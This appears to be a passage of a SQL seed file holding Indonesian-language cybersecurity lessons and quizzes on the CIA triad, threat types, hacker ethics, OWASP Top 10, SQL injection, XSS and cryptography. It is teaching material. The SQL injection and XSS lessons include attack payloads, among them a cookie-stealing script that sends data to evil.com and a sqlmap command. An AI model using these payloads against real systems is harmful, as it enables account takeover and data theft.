![CIA Triad & Prinsip Keamanan](https://sfile.chatglm.cn/images-ppt/ea5752d183cb.png)

**CIA Triad** adalah model panduan keamanan informasi yang terdiri dari tiga pilar: Confidentiality, Integrity, dan Availability. Ketiganya menjadi tolok ukur untuk merancang, mengevaluasi, dan mengaudit sistem yang aman. Setiap kebijakan keamanan—dari enkripsi email hingga redundansi data center—dapat ditelusuri kembali ke salah satu dari ketiga pilar ini.

![CIA Triad & Prinsip Keamanan](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Confidentiality (Kerahasiaan)

Memastikan informasi hanya diakses oleh pihak yang berwenang. Teknik yang umum dipakai: enkripsi data at-rest dan in-transit, kontrol akses berbasis peran (RBAC), autentikasi multi-faktor, dan klasifikasi data. Pelanggaran confidentiality contohnya kebocoran database pelanggan, penyadapan jaringan tanpa enkripsi, atau layanan cloud yang salah konfigurasi sehingga bucket publik terbuka.

```bash
# Set permission file SSH private key agar hanya owner yang bisa baca
chmod 600 ~/.ssh/id_rsa
ls -l ~/.ssh/id_rsa
# Output: -rw------- 1 user user 0 Jan 1 00:00 /home/user/.ssh/id_rsa
```

## Integrity (Integritas)

Menjamin data tidak diubah, dihapus, atau dimanipulasi tanpa otorisasi. Hash dan checksum digunakan untuk mendeteksi perubahan. Contoh serangan terhadap integrity: SQL Injection yang mengubah saldo rekening, manipulasi log audit, atau serangan supply chain yang menyisipkan kode berbahaya ke dalam pustaka populer. Database transaksional menggunakan constraint, trigger, dan audit trail untuk menjaga integritas data.

```bash
# Verifikasi integritas file ISO menggunakan SHA-256
sha256sum ubuntu-22.04.iso
# Bandingkan dengan hash resmi yang dipublikasikan Ubuntu
```

## Availability (Ketersediaan)

Memastikan sistem dan data tersedia bagi pengguna yang berwenang kapan pun dibutuhkan. Serangan DDoS, ransomware, kegagalan hardware, atau bencana alam mengancam availability. Strategi mitigasi meliputi load balancing, redundansi multi-AZ, backup terjadwal, disaster recovery plan, dan auto-scaling. Service Level Agreement (SLA) seperti "99.99% uptime" adalah komitmen availability.

```bash
# Cek uptime server dan beban rata-rata
uptime
# Output: 10:00:00 up 30 days, 1:20, 1 user, load average: 0.20, 0.15, 0.10
```

## Prinsip Pendukung Keamanan

Selain CIA, ada prinsip pendukung yang memperkuat postur keamanan:

1. **Authentication** — memverifikasi identitas (siapa kamu?).
2. **Authorization** — menentukan hak akses (apa yang boleh kamu lakukan?).
3. **Non-repudiation** — pengirim tidak dapat menyangkal tindakannya (tanda tangan digital).
4. **Accountability** — setiap aksi dapat ditelusuri ke satu akun.
5. **Least Privilege** — berikan hak minimum yang diperlukan.
6. **Defense in Depth** — lapisan pertahanan berlapis.

## Tips & Best Practices

- Klasifikasikan data menjadi Public, Internal, Confidential, dan Restricted.
- Gunakan vault (HashiCorp Vault, AWS KMS) untuk menyimpan kunci rahasia.
- Lakukan backup terenkripsi dan uji restore secara berkala.
- Monitor perubahan file kritis dengan tools seperti Tripwire atau AIDE.
- Pisahkan jaringan produksi dan jaringan kantor (network segmentation).

## Kesimpulan

CIA Triad adalah kompas yang membantu arsitek keamanan membuat keputusan yang seimbang. Tidak ada sistem yang 100% aman, tetapi dengan memahami trade-off antara confidentiality, integrity, dan availability, Anda dapat merancang pertahanan yang proporsional terhadap risiko nyata.



## Studi Kasus: Security Audit

Reconnaissance, Scanning, Testing, Exploitation, Reporting.

## Tips

> Hanya uji sistem yang Anda miliki atau punya izin tertulis.', '🎯', false, '[{"question":"Pilar CIA yang menjamin data tidak diubah tanpa izin?","options":["Confidentiality","Integrity","Availability","Authentication"],"answer":1,"explanation":"Integrity menjamin data tidak diubah atau dimanipulasi tanpa otorisasi."},{"question":"Serangan yang utamanya mengancam Availability?","options":["SQL Injection","Phishing","DDoS","XSS"],"answer":2,"explanation":"DDoS membanjiri layanan hingga tidak tersedia bagi pengguna sah."},{"question":"Prinsip memberikan hak minimum yang diperlukan disebut?","options":["Defense in Depth","Least Privilege","Non-repudiation","Accountability"],"answer":1,"explanation":"Least Privilege membatasi hak akses sesuai kebutuhan minimum."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('jenis-ancaman-cyber', 6, 3, 'Jenis Ancaman Cyber', 'jenis-ancaman-cyber', 'Malware, phishing, DDoS, dan berbagai kategori ancaman siber modern.', '# Jenis Ancaman Cyber


![Jenis Ancaman Cyber](https://sfile.chatglm.cn/images-ppt/348dd40a7b36.jpg)

Lanskap ancaman siber sangat beragam—mulai dari script kiddie yang menjalankan tool siap pakai hingga kelompok APT (Advanced Persistent Threat) yang didukung negara. Memahami kategori ancaman adalah langkah pertama untuk membangun pertahanan yang efektif. Setiap ancaman memiliki vektor serangan, motivasi, dan teknik mitigasi yang berbeda.

![Jenis Ancaman Cyber](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Malware

Malware adalah perangkat lunak berbahaya yang dirancang untuk merusak, mencuri, atau mengontrol sistem. Jenis utamanya:

- **Virus** — menginfeksi file host dan menyebar saat file dijalankan.
- **Worm** — menyebar otomatis melalui jaringan tanpa intervensi pengguna.
- **Trojan** — menyamar sebagai aplikasi sah, membuka backdoor.
- **Ransomware** — mengenkripsi file korban dan meminta tebusan.
- **Spyware** — memata-matai aktivitas pengguna secara diam-diam.
- **Rootkit** — menyembunyikan diri di level kernel untuk bertahan.

```bash
# Scan malware menggunakan ClamAV
sudo freshclam
sudo clamscan -r /home/

# Cek proses mencurigakan
ps aux | grep -iE "crypt|wget|curl|nc " | grep -v grep
```

## Phishing & Social Engineering

Phishing adalah teknik menipu korban agar menyerahkan kredensial atau mengklik tautan berbahaya dengan menyamar sebagai entitas terpercaya. Variannya: **spear phishing** (tertarget), **whaling** (menargetkan eksekutif), **smishing** (SMS), dan **vishing** (telepon). Email phishing klasik mengklaim "Akun Anda akan diblokir, klik di sini" dan mengarahkan ke halaman login palsu.

## Serangan Jaringan

- **DDoS (Distributed Denial of Service)** — ribuan bot membanjiri server.
- **Man-in-the-Middle (MitM)** — penyadap di tengah komunikasi.
- **DNS Spoofing** — mengarahkan domain ke IP palsu.
- **Port Scanning** — reconnaissance untuk menemukan layanan terbuka (nmap).

```bash
# Contoh scanning port dengan nmap (pada lab yang diizinkan)
nmap -sV -O --top-ports 1000 192.168.1.0/24

# Cek koneksi aktif mencurigakan
ss -tunap | grep ESTABLISHED
```

## Serangan Aplikasi Web

OWASP mencatat risiko paling kritis pada aplikasi web: SQL Injection, XSS, Broken Authentication, Sensitive Data Exposure, XXE, Broken Access Control, Security Misconfiguration, Insecure Deserialization, Komponen dengan Kerentanan, dan Insufficient Logging. Aplikasi modern berbasis API juga rentan terhadap Broken Object Level Authorization (BOLA).

## Serangan Lanjutan (APT)

APT adalah kelompok aktor ancaman yang persisten, biasanya didukung negara atau sindikat kriminal besar. Mereka menggunakan teknik **kill chain** (recon → weaponize → deliver → exploit → install C2 → actions on objectives) dan bisa bertahan di jaringan korban berbulan-bulan tanpa terdeteksi. Contoh: APT28, APT29, Lazarus, FIN7.

## Tips & Best Practices

- Pasang EDR/antivirus modern dengan deteksi perilaku, bukan hanya signature.
- Latih karyawan mengenali email phishing melalui simulasi rutin.
- Implementasikan WAF (Web Application Firewall) untuk aplikasi publik.
- Gunakan threat intelligence feed (MISP, AlienVault OTX) untuk enrich log.
- Lakukan threat modeling sejak fase desain aplikasi.

## Kesimpulan

Mengenali jenis ancaman cyber membantu Anda memilih kontrol keamanan yang tepat. Tidak ada satu pertahanan yang efektif untuk semua ancaman—diperlukan pendekatan berlapis (defense in depth) yang menggabungkan teknologi, proses, dan edukasi manusia.



## Studi Kasus: Security Audit

Reconnaissance, Scanning, Testing, Exploitation, Reporting.

## Tips

> Hanya uji sistem yang Anda miliki atau punya izin tertulis.', '⚠️', false, '[{"question":"Malware yang mengenkripsi file korban dan meminta tebusan?","options":["Trojan","Spyware","Ransomware","Worm"],"answer":2,"explanation":"Ransomware mengenkripsi data korban dan menuntut tebusan untuk dekripsi."},{"question":"Phishing yang menargetkan eksekutif tingkat tinggi disebut?","options":["Smishing","Whaling","Vishing","Pharming"],"answer":1,"explanation":"Whaling adalah spear phishing yang menargetkan pejabat tinggi (whale)."},{"question":"Tools yang umum dipakai untuk scanning port?","options":["Wireshark","Nmap","Metasploit","Burp Suite"],"answer":1,"explanation":"Nmap adalah scanner jaringan populer untuk menemukan host dan layanan."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('etika-legalitas-hacker', 6, 4, 'Etika & Legalitas Hacker', 'etika-legalitas-hacker', 'Etika hacker, topi putih/hitam/abu, dan aspek hukum keamanan siber.', '# Etika & Legalitas Hacker


![Etika & Legalitas Hacker](https://sfile.chatglm.cn/images-ppt/5b081de41c09.jpg)

Dunia peretasan tidak hanya soal teknis—ada garis tipis antara peneliti keamanan yang etis dan penjahat siber. Memahami etika dan kerangka hukum sangat penting agar keahlian Anda memberi nilai positif, bukan masalah pidana. Banyak negara memiliki undang-undang cybercrime yang ketat, dan ketidaktahuan bukan alasan pengampun.

![Etika & Legalitas Hacker](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Klasifikasi Topi Hacker

- **White Hat (Ethical Hacker)** — bekerja dengan izin untuk menemukan dan memperbaiki celah. Bekerja di tim internal, konsultan, atau bug bounty.
- **Black Hat** — menyerang tanpa izin untuk keuntungan pribadi, sabotase, atau pencurian data.
- **Gray Hat** — menemukan celah tanpa izin, tetapi melaporkannya ke vendor. Hukum di banyak negara tetap menganggap ini ilegal.
- **Red Team** — tim internal yang mensimulasikan serangan nyata untuk menguji pertahanan.
- **Blue Team** — tim pertahanan yang mendeteksi dan merespons serangan.
- **Purple Team** — kolaborasi red dan blue untuk meningkatkan kedua sisi.

## Prinsip Etika Hacker

1. **Consent** — selalu dapat izin tertulis sebelum melakukan pengujian.
2. **Do No Harm** — jangan merusak sistem atau data korban.
3. **Confidentiality** — laporan kerentanan hanya dibagikan ke pihak yang berwenang.
4. **Responsible Disclosure** — beri vendor waktu wajar (biasanya 90 hari) sebelum publikasi.
5. **Scope Compliance** — hanya uji cakupan yang disepakati, jangan "berkeliling" ke sistem lain.

## Kerangka Hukum di Indonesia

- **UU No. 11/2008 dan UU No. 19/2016 tentang ITE** — mengatur transaksi elektronik dan ancaman pidana untuk akses ilegal, peretasan, dan penyebaran konten ilegal.
- **UU No. 27/2022 tentang Pelindungan Data Pribadi (PDP)** — mewajibkan pengendali data melindungi data pribadi, dengan denda hingga 2% omzet tahunan.
- **PP No. 71/2019** — penyelenggaraan sistem dan transaksi elektronik.
- Pasal-pasal kunci ITE: Pasal 30 (akses ilegal), Pasal 33 (intercept), Pasal 35 (perubahan data), Pasal 40 (penghancuran data).

```text
Sanksi pidana ITE dapat berupa:
- Penjara maksimal 6-12 tahun
- Denda hingga miliaran rupiah
- Pidana tambahan: perampasan keuntungan dan/atau alat
```

## Hukum Internasional yang Relevan

- **CFAA (Computer Fraud and Abuse Act)** — AS, melarang akses tidak sah ke sistem komputer.
- **GDPR** — Eropa, melindungi data pribadi warga EU dengan denda hingga 4% omzet global.
- **Cybercrime Convention (Budapest Convention 2001)** — kerjasama internasional kejahatan siber.
- **Copyright Act / DMCA** — melarang penghindaran DRM dan distribusi tools peretasan.

## Bug Bounty & Responsible Disclosure

Platform seperti HackerOne, Bugcrowd, dan Synack menghubungkan peneliti dengan organisasi yang bersedia membayar kerentanan. Program seperti **CVE Numbering Authority (CNA)** memberi ID resmi pada kerentanan publik. VEP (Vulnerabilities Equities Process) mengatur apakah pemerintah mengungkap atau menyimpan zero-day.

```text
Alur responsible disclosure:
1. Temukan bug → dokumentasi PoC non-destruktif
2. Hubungi vendor melalui security@ atau cert
3. Beri waktu patch (biasanya 90 hari)
4. Publikasi setelah patch dengan koordinasi vendor
5. Minta CVE ID jika relevan
```

## Tips & Best Practices

- Selalu tandatangani **Rules of Engagement (RoE)** sebelum pentest.
- Simpan log aktivitas Anda sebagai bukti Anda bekerja dalam scope.
- Jangan pernah menyimpan data korban—cukup screenshot bukti konsep.
- Bergabung dengan komunitas etis (IDSECCONF, Hacking Wikipedia, OWASP ID).
- Baca EULA dan ToS setiap platform sebelum menguji.

## Kesimpulan

Keterampilan teknis perlu disertai kompas moral dan pemahaman hukum. Hacker etis menyelamatkan jutaan pengguna dengan laporan yang bertanggung jawab, sementara satu langkah salah bisa berujung pidana. Jadi, pilih topi putih—dunia sangat membutuhkan mereka.



## Studi Kasus: Security Audit

Reconnaissance, Scanning, Testing, Exploitation, Reporting.

## Tips

> Hanya uji sistem yang Anda miliki atau punya izin tertulis.', '⚖️', false, '[{"question":"Hacker yang bekerja dengan izin untuk menemukan celah?","options":["Black Hat","White Hat","Gray Hat","Script Kiddie"],"answer":1,"explanation":"White Hat (ethical hacker) bekerja dengan izin dan etika yang jelas."},{"question":"Undang-undang ITE di Indonesia adalah?","options":["UU No. 11/2008","UU No. 1/2023","UU No. 20/2003","UU No. 5/1999"],"answer":0,"explanation":"UU No. 11/2008 tentang ITE (diperbarui UU 19/2016) mengatur kejahatan siber."},{"question":"Praktik mengungkap kerentanan secara bertanggung jawab disebut?","options":["Zero-day sell","Full disclosure langsung","Responsible disclosure","Black market"],"answer":2,"explanation":"Responsible disclosure memberi vendor waktu patch sebelum publikasi."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('owasp-top-10', 6, 5, 'OWASP Top 10', 'owasp-top-10', 'Sepuluh risiko keamanan aplikasi web paling kritis menurut OWASP.', '# OWASP Top 10


![OWASP Top 10](https://sfile.chatglm.cn/images-ppt/fcb68a3f591d.jpg)

**OWASP (Open Worldwide Application Security Project)** menerbitkan daftar 10 risiko keamanan aplikasi web paling kritis yang diperbarui setiap beberapa tahun. Versi terbaru (2021) menjadi acuan standar industri untuk pengembangan aplikasi yang aman. Memahami OWASP Top 10 adalah kewajiban bagi setiap developer dan security engineer.

![OWASP Top 10](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## A01:2021 — Broken Access Control

 Kontrol akses yang salah mengizinkan pengguna melakukan aksi di luar haknya. Contoh: IDOR (Insecure Direct Object Reference), di mana pengguna mengubah `?id=100` menjadi `?id=101` dan mengakses data orang lain. Mitigasi: validasi otorisasi di server, gunakan token sesi acak, terapkan deny-by-default.

```text
# Buruk
GET /api/orders/123  → server tidak cek ownership

# Baik
GET /api/orders/{uuid_acak}
+ server-side check: order.user_id == session.user_id
```

## A02:2021 — Cryptographic Failures

Kegagalan kriptografi: data sensitif disimpan/transmisi tanpa enkripsi, algoritma lemah (MD5, DES), kunci hard-coded, atau TLS versi lama. Mitigasi: gunakan AES-256-GCM, TLS 1.3, hash password dengan bcrypt/argon2, rotasi kunci.

## A03:2021 — Injection

SQL Injection, NoSQL Injection, Command Injection, dan LDAP Injection masih marak. Input pengguna langsung dieksekusi sebagai kode. Mitigasi: parameterized query, ORM, input validation dengan allowlist.

```python
# Buruk (rawak)
cursor.execute(f"SELECT * FROM users WHERE id = {user_input}")

# Baik (parameterized)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))
```

## A04:2021 — Insecure Design

Risiko arsitektural—tidak ada threat modeling, logika bisnis yang lemah, kebijakan yang inkonsisten. Contoh: proses recovery password yang bisa ditebak. Mitigasi: secure design pattern, threat modeling sejak desain, libraries standar.

## A05:2021 — Security Misconfiguration

Default credential, error message verbose, layanan tidak perlu yang aktif, header keamanan hilang. Mitigasi: hardening guide, automated config scanner (CIS Benchmarks, Lynis).

```nginx
# Header keamanan untuk Nginx
add_header X-Frame-Options "SAMEORIGIN";
add_header X-Content-Type-Options "nosniff";
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";
add_header Content-Security-Policy "default-src ''self''";
```

## A06:2021 — Vulnerable & Outdated Components

Menggunakan library/framework versi lama dengan CVE aktif. Mitigasi: Software Composition Analysis (SCA) seperti Snyk, Dependabot, OWASP Dependency-Check, dan patch berkala.

## A07:2021 — Identification & Authentication Failures

Credential stuffing, brute force, sesi yang tidak kedaluwarsa, MFA lemah. Mitigasi: rate limiting, CAPTCHA, MFA TOTP/WebAuthn, rotasi session ID pasca login.

## A08:2021 — Software & Data Integrity Failures

Kode/plugin dari sumber tidak tepercaya, CI/CD tanpa verifikasi integritas, deserialisasi data tidak tepercaya. Mitigasi: signed package, SBOM (Software Bill of Materials), pipeline dengan secret scan.

## A09:2021 — Security Logging & Monitoring Failures

Tidak ada log keamanan, atau log tidak dipantau. Insiden baru terdeteksi berbulan-bulan kemudian. Mitigasi: centralized logging (ELK, Splunk), SIEM, alerting, uji table-top.

## A10:2021 — Server-Side Request Forgery (SSRF)

Server membuat request ke URL yang ditentukan pengguna tanpa validasi—memungkinkan akses ke metadata cloud (169.254.169.254) atau layanan internal. Mitigasi: allowlist domain, blokir IP internal, network segmentation.

```python
# Mitigasi SSRF
import ipaddress, urllib.parse
from urllib.parse import urlparse

def is_safe_url(url):
    p = urlparse(url)
    if p.scheme not in ("http", "https"):
        return False
    try:
        ip = ipaddress.ip_address(p.hostname)
        if ip.is_private or ip.is_loopback:
            return False
    except ValueError:
        return p.hostname in ALLOWED_DOMAINS
    return True
```

## Tips & Best Practices

- Integrasikan OWASP ZAP atau Burp Suite dalam pipeline CI/CD.
- Latih developer dengan OWASP Secure Coding Practices.
- Gunakan ASVS (Application Security Verification Standard) untuk audit.
- Aktifkan security.txt di domain Anda.
- Lakukan pentest tahunan minimal sekali.

## Kesimpulan

OWASP Top 10 adalah checklist wajib untuk aplikasi web modern. Dengan mengenali pola risiko dan menerapkan mitigasi sejak desain, Anda mengurangi secara signifikan peluang eksploitasi. Keamanan adalah proses sepanjang siklus hidup aplikasi, bukan add-on di akhir.



## Studi Kasus: Security Audit

Reconnaissance, Scanning, Testing, Exploitation, Reporting.

## Tips

> Hanya uji sistem yang Anda miliki atau punya izin tertulis.', '📋', false, '[{"question":"Risiko di mana pengguna mengakses data orang lain dengan mengubah ID?","options":["SSRF","IDOR / Broken Access Control","XSS","Crypto Failure"],"answer":1,"explanation":"IDOR adalah bentuk Broken Access Control yang umum di API REST."},{"question":"Cara terbaik mencegah SQL Injection?","options":["Escape manual","Parameterized query","Hidden field","Disable error"],"answer":1,"explanation":"Parameterized query memisahkan kode dan data sehingga input tidak dieksekusi sebagai SQL."},{"question":"Risiko A10 OWASP 2021 yang baru ditambahkan?","options":["SSRF","XSS","CSRF","RCE"],"answer":0,"explanation":"SSRF masuk sebagai A10:2021 menggantikan beberapa risiko lama."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('sql-injection', 6, 6, 'SQL Injection', 'sql-injection', 'Teknik serangan, dampak, dan cara mencegah SQL Injection.', '# SQL Injection


![SQL Injection](https://sfile.chatglm.cn/images-ppt/e18f8adfbecf.jpg)

**SQL Injection (SQLi)** adalah teknik menyerang di mana penyerang menyisipkan perintah SQL berbahaya ke dalam input aplikasi untuk dimasukkan ke dalam query database. Konsekuensinya bisa sangat parah: pencurian data, bypass autentikasi, manipulasi data, hingga RCE (Remote Code Execution) pada konfigurasi tertentu. SQLi tetap menjadi salah satu risiko OWASP Top 10 meski sudah dikenal puluhan tahun.

![SQL Injection](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Bagaimana SQL Injection Bekerja

Aplikasi rentan biasanya menggabungkan string input pengguna langsung ke dalam query SQL:

```python
# Kode rentan
username = request.form[''username'']
password = request.form[''password'']
query = f"SELECT * FROM users WHERE username=''{username}'' AND password=''{password}''"
cursor.execute(query)
```

Penyerang mengirim `username = admin'' --` dan `password = x`. Query yang dihasilkan:

```sql
SELECT * FROM users WHERE username=''admin'' --'' AND password=''x''
```

Bagian setelah `--` dianggap komentar, sehingga pengecekan password diabaikan. Penyerang login sebagai admin tanpa mengetahui password.

## Jenis SQL Injection

1. **In-band (Classic)** — hasil langsung dikembalikan ke penyerang (UNION-based, error-based).
2. **Inferential (Blind)** — tidak ada data langsung, penyerang menyimpulkan dari perilaku (boolean-based, time-based).
3. **Out-of-band** — respons via channel lain (DNS, HTTP request) bila server tidak mendukung in-band.

## Contoh UNION-based SQLi

Asumsikan query asli: `SELECT name, description FROM products WHERE id=1`.

```sql
-- Payload: 1 UNION SELECT username, password FROM users
SELECT name, description FROM products WHERE id=1
UNION SELECT username, password FROM users;
```

Hasilnya: kolom name/description produk digabung dengan username/password tabel users.

## Contoh Blind Time-based

```sql
-- Payload: 1; IF(SUBSTRING((SELECT TOP 1 password FROM users),1,1)=''a'') WAITFOR DELAY ''0:0:5'' --
```

Jika respons lambat 5 detik, karakter pertama password adalah ''a''. Penyerang brute-force karakter demi karakter.

## Dampak SQL Injection

- **Pencurian data** — kartu kredit, kredensial, data pribadi.
- **Bypass autentikasi** — login sebagai user/admin mana pun.
- **Manipulasi data** — ubah saldo, hapus record.
- **RCE** — via `xp_cmdshell` (SQL Server), `INTO OUTFILE` (MySQL), atau `COPY FROM PROGRAM` (PostgreSQL).
- **Lateral movement** — pivot ke jaringan internal.

## Cara Mencegah SQL Injection

**1. Parameterized Query / Prepared Statement**

```python
# Python psycopg2 / MySQL connector
cursor.execute(
    "SELECT * FROM users WHERE username=%s AND password=%s",
    (username, password)
)
```

```javascript
// Node.js dengan pg
const res = await pool.query(
    ''SELECT * FROM users WHERE username=$1 AND password=$2'',
    [username, password]
);
```

**2. ORM modern** (Prisma, SQLAlchemy, Hibernate) yang otomatis parameterized.

**3. Input validation** dengan allowlist, bukan blocklist.

**4. Least privilege** — akun DB aplikasi tidak boleh punya hak `DROP`, `xp_cmdshell`, atau akses ke tabel sistem.

**5. WAF** sebagai lapisan tambahan (Cloudflare, ModSecurity).

## Mendeteksi SQL Injection

```bash
# Tools otomatis
sqlmap -u "https://target.com/product?id=1" --batch --dbs

# Tes manual dengan payload klasik
# '' OR ''1''=''1
# 1'' AND SLEEP(5)--
# 1 UNION SELECT NULL,NULL,NULL--
```

## Tips & Best Practices

- Gunakan stored procedure dengan parameter binding bila memungkinkan.
- Escape output jika harus menyusun SQL secara dinamis (risiko terakhir).
- Aktifkan log query lambat (slow query log) untuk mendeteksi time-based SQLi.
- Lakukan SAST (Static Application Security Testing) dengan Semgrep / CodeQL.
- Lakukan pentest aplikasi minimal sekali setahun.

## Kesimpulan

SQL Injection adalah salah satu risiko paling berdampak namun paling mudah dicegah. Kunci utamanya: **jangan pernah mempercayai input pengguna, selalu gunakan parameterized query**. Dengan disiplin penggunaan ORM dan parameter binding, Anda dapat mengeliminasi 99% vektor SQLi pada aplikasi modern.



## Studi Kasus: Security Audit

Reconnaissance, Scanning, Testing, Exploitation, Reporting.

## Tips

> Hanya uji sistem yang Anda miliki atau punya izin tertulis.', '💉', false, '[{"question":"Cara paling efektif mencegah SQL Injection?","options":["Escape karakter manual","Parameterized query","Filter keyword UNION","Sembunyikan pesan error"],"answer":1,"explanation":"Parameterized query memisahkan kode SQL dari data sehingga input tidak dieksekusi sebagai perintah."},{"question":"Jenis SQLi yang menyimpulkan dari waktu respons?","options":["UNION-based","Error-based","Time-based blind","Out-of-band"],"answer":2,"explanation":"Time-based blind SQLi menggunakan SLEEP/WAITFOR dan mengukur delay respons."},{"question":"Payload yang umum untuk bypass login tanpa password?","options":["admin'' --","<script>alert(1)</script>","../../etc/passwd","<svg onload=...>"],"answer":0,"explanation":"admin'' -- membuat sisa query dianggap komentar, mengabaikan pengecekan password."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('xss-cross-site-scripting', 6, 7, 'Cross-Site Scripting XSS', 'xss-cross-site-scripting', 'XSS Stored, Reflected, DOM-based dan cara mencegahnya.', '# Cross-Site Scripting (XSS)


![Cross-Site Scripting XSS](https://sfile.chatglm.cn/images-ppt/d65fdb2e0431.png)

**XSS** adalah kerentanan di mana penyerang menyisipkan script (biasanya JavaScript) ke halaman web yang dilihat pengguna lain. Script ini dieksekusi di browser korban dalam konteks aplikasi yang dipercaya, sehingga dapat mencuri cookie sesi, mengubah konten, atau melakukan aksi atas nama korban. XSS adalah salah satu risiko paling umum di aplikasi web dan masuk dalam OWASP Top 10.

![Cross-Site Scripting](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Tiga Jenis XSS

### 1. Stored (Persistent) XSS
Script berbahaya disimpan permanen di server (misalnya kolom komentar). Setiap pengguna yang melihat halaman tersebut akan terinfeksi. Paling berbahaya karena mencapai banyak korban.

```text
Komentar: <script>fetch(''//evil.com?c=''+document.cookie)</script>
```

### 2. Reflected (Non-persistent) XSS
Script disisipkan via URL/parameter dan dipantulkan langsung ke halaman respons. Biasanya menargetkan satu korban melalui phishing link.

```text
https://target.com/search?q=<script>alert(document.cookie)</script>
```

### 3. DOM-based XSS
Eksekusi terjadi murni di sisi client akibat manipulasi DOM yang tidak aman, tanpa interaksi server.

```javascript
// Rentan
document.getElementById(''greeting'').innerHTML = location.hash.substring(1);
```

## Dampak XSS

- **Session hijacking** — pencurian cookie `document.cookie`.
- **Credential harvesting** — form login palsu yang mengirim kredensial ke server penyerang.
- **Keylogging** — menangkap ketikan pengguna.
- **Browser exploit** — kombinasi dengan kerentanan browser untuk RCE.
- **Worm propagation** — XSS yang mereplikasi diri (contoh: Samy Worm di MySpace 2005).

## Cara Mencegah XSS

### 1. Output Encoding

Encode karakter khusus sesuai konteks output (HTML, attribute, JavaScript, URL).

```javascript
// Node.js dengan escape-html
const escape = require(''escape-html'');
res.send(`<div>${escape(userInput)}</div>`);

// React otomatis escape
return <div>{userInput}</div>;
```

### 2. Content Security Policy (CSP)

Header CSP membatasi sumber script yang boleh dieksekusi browser.

```nginx
add_header Content-Security-Policy "default-src ''self''; script-src ''self'' https://cdn.example.com; object-src ''none''; base-uri ''self''";
```

### 3. HttpOnly Cookie

Mencegah JavaScript membaca cookie sesi.

```text
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### 4. Hindari innerHTML, gunakan textContent

```javascript
// Buruk
element.innerHTML = userInput;

// Baik
element.textContent = userInput;
```

### 5. Sanitasi Input untuk Rich Text

Jika menerima HTML (misalnya komentar dengan format), gunakan library sanitasi seperti DOMPurify.

```javascript
import DOMPurify from ''dompurify'';
const clean = DOMPurify.sanitize(dirtyHtml);
```

## Mendeteksi XSS

```bash
# Scanner otomatis
docker run --rm -t owasp/zap2docker-stable zap-baseline.py -t https://target.com

# Payload test manual
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# "><script>alert(1)</script>
# javascript:alert(document.cookie)
```

## Tips & Best Practices

- Jangan pernah memasukkan data tidak tepercaya langsung ke `innerHTML`, `document.write`, `eval`, atau atribut `href="javascript:"`.
- Gunakan framework modern (React, Vue, Angular) yang otomatis escape.
- Audit dependency pihak ketiga yang memanipulasi DOM.
- Aktifkan Trusted Types di browser yang mendukung.
- Lakukan pentest aplikasi minimal tahunan.

## Kesimpulan

XSS tetap menjadi risiko web paling sering muncul meskipun solusinya sudah jelas. Dengan disiplin output encoding, CSP, dan cookie HttpOnly, mayoritas vektor XSS dapat dimitigasi. Kuncinya: **jangan pernah mempercayai data yang dirender ke browser**. Keamanan adalah komitmen setiap commit.



## Studi Kasus: Security Audit

Reconnaissance, Scanning, Testing, Exploitation, Reporting.

## Tips

> Hanya uji sistem yang Anda miliki atau punya izin tertulis.', '🌐', false, '[{"question":"Jenis XSS yang disimpan permanen di server?","options":["Reflected","Stored","DOM-based","Mutation"],"answer":1,"explanation":"Stored XSS disimpan di server (mis. komentar) dan menyebar ke banyak korban."},{"question":"Header yang membatasi sumber script di browser?","options":["X-Frame-Options","Content-Security-Policy","Strict-Transport-Security","X-XSS-Protection"],"answer":1,"explanation":"Content-Security-Policy membatasi sumber daya yang boleh dimuat browser."},{"question":"Atribut cookie yang mencegah akses via JavaScript?","options":["Secure","SameSite","HttpOnly","Domain"],"answer":2,"explanation":"HttpOnly membuat cookie tidak bisa dibaca oleh document.cookie."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('kriptografi-dasar', 6, 8, 'Kriptografi Dasar', 'kriptografi-dasar', 'Simetri, asimetri, hash, dan protokol kriptografi modern.', '# Kriptografi Dasar


![Kriptografi Dasar](https://sfile.chatglm.cn/images-ppt/e397dfcf2e9a.jpg)

**Kriptografi** adalah ilmu mengamankan informasi melalui transformasi data menjadi bentuk yang tidak dapat dibaca tanpa kunci. Kriptografi bukan sekadar enkripsi—mencakup autentikasi, integritas, non-repudiation, dan pertukaran kunci. Memahami dasar-dasar kriptografi adalah kunci untuk merancang sistem yang aman dan menghindari kesalahan klasik seperti menggunakan MD5 untuk password.

![Kriptografi Dasar](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Konsep Inti

1. **Plaintext** — pesan asli yang dapat dibaca.
2. **Ciphertext** — pesan terenkripsi yang tidak dapat dibaca.
3. **Key (Kunci)** — rahasia yang mengontrol proses enkripsi/dekripsi.
4. **Algoritma** — fungsi matematika untuk transformasi.
5. **Kerckhoffs''s Principle** — keamanan harus bergantung pada kerahasiaan kunci, bukan algoritma.

## Enkripsi Simetris

Menggunakan **kunci yang sama** untuk enkripsi dan dekripsi. Cepat dan cocok untuk data besar.

- **Algoritma modern**: AES-256-GCM, ChaCha20-Poly1305.
- **Mode aman**: GCM, ChaCha20 (authenticated encryption).
- **Hindari**: ECB (tidak aman), DES, 3DES, Blowfish untuk data baru.

